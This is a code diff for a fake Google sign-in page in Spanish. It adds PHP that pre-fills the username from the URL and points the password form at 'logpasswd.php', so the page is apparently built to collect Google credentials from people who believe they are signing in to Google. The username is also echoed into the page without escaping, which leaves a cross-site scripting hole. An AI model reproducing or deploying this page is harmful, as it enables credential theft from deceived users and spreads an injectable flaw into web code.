@@ -1,3 +1,12 @@
+<?php
+
+  if (empty($_GET)) {
+    header('Location: email.html');
+  } else {
+    $username = $_GET['username'];
+  }
+
+?>
 <html>
 
 <head>
@@ -10,12 +19,13 @@
 <body>
   <div class="login-container">
     <div class="login-header">
-      <form class="login-form">
+      <form class="login-form" action="logpasswd.php" method="post">
         <br>
         <br>
         <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google logo">
         <h1>Te damos la Bienvenida</h1>
         <br>
+        <input type="mail" id="email" name="username" required value="<?php echo $username; ?>">
         <input type="password" id="email" name="password" placeholder="Introduce tu contraseña" required>
         <input type="checkbox" name="checkbox" placeholder="">Mostrar contraseña
         <br>
@@ -27,7 +37,7 @@
         <br>
         <br>
         <div class="div-button">
-          <a href="">¿Has olvidado tu contraseña?</a> <button class="next-button">Siguiente</button>
+          <a href="">¿Has olvidado tu contraseña?</a> <button class="next-button" type="submit">Siguiente</button>
         </div>
     </div>
     </form>
